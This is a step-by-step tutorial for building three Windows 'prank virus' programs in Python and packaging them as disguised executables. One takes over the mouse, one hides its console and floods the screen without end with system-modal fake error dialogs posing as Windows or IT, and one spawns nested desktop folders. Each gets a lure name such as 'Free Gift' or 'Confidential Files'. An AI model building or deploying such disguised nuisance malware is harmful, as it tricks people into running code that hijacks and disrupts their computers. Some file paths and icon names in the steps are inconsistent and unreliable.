# Virus 1

### Step 1: Make a new folder (in downloads folder) and name it malware


### Step 2: Setup your Virtual Environment

Open VS Code of your project folder (which is the malware folder) and paste this:

To activate:
```bash 
python -m venv venv
```

```bash
venv\Scripts\activate
```

Then move to your folder directory
```bash
cd virus1
```
 ### Step 3: Install Required Libraries

```bash
pip install pyautogui psutil pywin32 pygame
```

### Step 4: ghost_prank.py

```bash
import os
import random
import time
import pyautogui
import psutil
import win32gui
import win32con
from threading import Thread
import pygame  # 🔊 For playing .wav sound

# ===== CONFIG =====
FOLDER_NAME = "GHOST_FOLDER"
DELAY_SECONDS = 1
DURATION_MINUTES = 2
SHOW_FAKE_ERROR = True
# ==================

def show_fake_error():
    """Shows a fake virus warning message and plays sound using pygame."""
    try:
        pygame.mixer.init()
        pygame.mixer.music.load("C:/Users/rivan/Downloads/668981__vestibule-door__monster-loose-alarm.wav")
        pygame.mixer.music.play()
    except Exception as e:
        print(f"Error playing sound: {e}")

    win32gui.MessageBox(
        0,
        "WARNING: GHOSTWARE DETECTED!\n\nYour system is haunted by a rogue folder spirit. Do not interfere!",
        "CRITICAL VIRUS ALERT",
        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL
    )

def create_folder():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    folder_path = os.path.join(desktop, FOLDER_NAME)
    os.makedirs(folder_path, exist_ok=True)
    return folder_path

def move_folder(folder_path):
    screen_width, screen_height = pyautogui.size()
    while True:
        try:
            x = random.randint(0, screen_width - 100)
            y = random.randint(0, screen_height - 100)
            os.system(f'powershell.exe -command "$sh = New-Object -ComObject Shell.Application; $sh.Namespace(0).ParseName(\'{folder_path}\').InvokeVerb(\'move\')"')
            pyautogui.moveTo(x, y, duration=0.5)
            pyautogui.click()
            time.sleep(DELAY_SECONDS)
        except:
            break

def is_explorer_running():
    return "explorer.exe" in (p.name() for p in psutil.process_iter())

def main():
    if not is_explorer_running():
        print("Error: Windows Explorer must be running!")
        return

    folder_path = create_folder()
    print(f"Ghost folder created at: {folder_path}")
    print("Press CTRL+C to stop early.")

    if SHOW_FAKE_ERROR:
        Thread(target=show_fake_error, daemon=True).start()

    Thread(target=move_folder, args=(folder_path,), daemon=True).start()

    if DURATION_MINUTES > 0:
        time.sleep(DURATION_MINUTES * 60)
    else:
        while True:
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nPrank stopped by user.")
    finally:
        print("The ghost has been banished! Folder remains but won't move anymore.")
```

### Step 5: Run ghost_prank.py
```bash
python ghost_prank.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: ghost
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into ghost
- Move the ghost.ico to your folder

Paste this: 
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=ghost.ico ghost_prank.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus1\dist\ghost_prank.exe
- Name it "TRICK OR TREAT"
- Right-click shortcut → Properties → Change Icon → Select your ghost.ico

# Virus 2

### Step 1: Inside the malware folder add a new folder (vs code) name it virus2

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus2
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: Fake_error.py
```bash
import random
import time
import win32gui
import win32con
import ctypes
import sys
from threading import Thread

# ===== CONFIG =====
MAX_SPEED = True          # Set to False for less aggressive spamming
HIDE_CONSOLE = True      # Run completely in background
# ==================


ERROR_MESSAGES = [
    "CRITICAL SYSTEM FAILURE: Hoy, magbayad ka na ng utang mo!",
    "VIRUS ALERT: May balance ka pa sa utang mo!",
    "BSOD IMMINENT: 0x0000007B Mabagal ang iyong PC",
    "ERROR: Kulang ka sa tulog at pagmamahal.",
    "WARNING: Nag-ooverheat na CPU mo.",
    "ALERT: Puno na ang memory, i-delete mo na mga screenshot ng ex mo!",
    "SYSTEM32 DELETION IN PROGRESS: 37% complete",
    "CRITICAL: Kailangan ko ng pera, pera, pera",
    "ERROR: May virus na galing sa pag-download ng 'FreeIphone.exe'!",
    "404: Utang na loob, bayaran mo na!",
    "ALERT:  Naubos ang RAM kasi bukas lahat ng tabs ng Chrome!",
    "FATAL ERROR: Storage full, i-delete mo na yung 100 selfies sa jeep!",
]

def show_error():
    """Shows a fake error message"""
    title = random.choice([
        "Microsoft Windows",
        "System Alert",
        "CRITICAL ERROR",
        "Virus Protection",
        "IT Department"
    ])
    
    style = random.choice([
        win32con.MB_ICONERROR | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONINFORMATION | win32con.MB_SYSTEMMODAL
    ])
    
    win32gui.MessageBox(
        0,
        random.choice(ERROR_MESSAGES),
        title,
        style
    )

def hide_console():
    """Completely hides the console window"""
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(),
        0
    )

def main():
    if HIDE_CONSOLE:
        hide_console()
    
    # Calculate delay based on intensity
    delay = 0.1 if MAX_SPEED else random.uniform(0.5, 1.5)
    
    # Main spamming loop
    while True:
        try:
            # Spawn multiple error threads for maximum chaos
            for _ in range(random.randint(1, 3 if MAX_SPEED else 1)):
                Thread(target=show_error).start()
            
            time.sleep(delay)
        except:
            pass

if __name__ == "__main__":
    # Make sure only one instance runs
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "FakeErrorMutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit()
        
        main()
    finally:
        if 'mutex' in locals():
            ctypes.windll.kernel32.CloseHandle(mutex)
```

Run it:
```bash
python fake_error.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: winrar
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into winrar
- Move the winrar.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=error.ico fake_error.py
```

#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus3\dist\fake_error.exe
- Name it "Confidential Files"


# Virus 3 Infinite Folder

### Step 1: Inside the malware folder add a new folder (vs code) name it virus3

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus3
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: infinitefolder_prank.py.

```bash
import os
import time
import shutil
from threading import Thread

# ===== CONFIG =====
FOLDER_NAME = "FOLDER_INVASION"    # Name of the main folder
DELAY_SECONDS = 0.3                # Speed of appearance (0.3s is optimal)
TOTAL_FOLDERS = 50                 # Total folders to create (stops automatically)
# ==================

def get_desktop_path():
    """Get the correct Desktop path (works with OneDrive too)"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop):
        desktop = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    return desktop

def create_visible_folders():
    """Creates folders that visibly appear on Desktop"""
    desktop = get_desktop_path()
    root_path = os.path.join(desktop, FOLDER_NAME)
    
    # Clear previous run if exists
    if os.path.exists(root_path):
        shutil.rmtree(root_path)
    
    # Create initial folder
    os.makedirs(root_path)
    
    # Create nested folders
    current_path = root_path
    for i in range(1, TOTAL_FOLDERS + 1):
        current_path = os.path.join(current_path, f"FOLDER_{i}")
        os.makedirs(current_path)
        
        # Force folder refresh on Windows
        if os.name == 'nt':
            os.system(f'explorer /select,"{current_path}"')
        
        print(f"Created: {current_path}")  # Console log
        time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("\n=== VISIBLE FOLDER PRANK ===")
    print(f"Creating {TOTAL_FOLDERS} folders on Desktop...\n")
    print("Watch them appear in real-time!")
    print("Press CTRL+C to stop early\n")
    
    try:
        create_visible_folders()
    except KeyboardInterrupt:
        print("\nStopped by user!")
    finally:
        print(f"\nDone! Check your Desktop for '{FOLDER_NAME}'")
        print("To delete: Right-click the folder and select 'Delete'")
```

Run it:
```bash
python infinitefolder_prank.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: gift
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into gift
- Move the gift.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=gift.ico infinitefolder_prank.py
```

#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus2\dist\infinitefolder_prank.exe
- Name it "Free Gift"

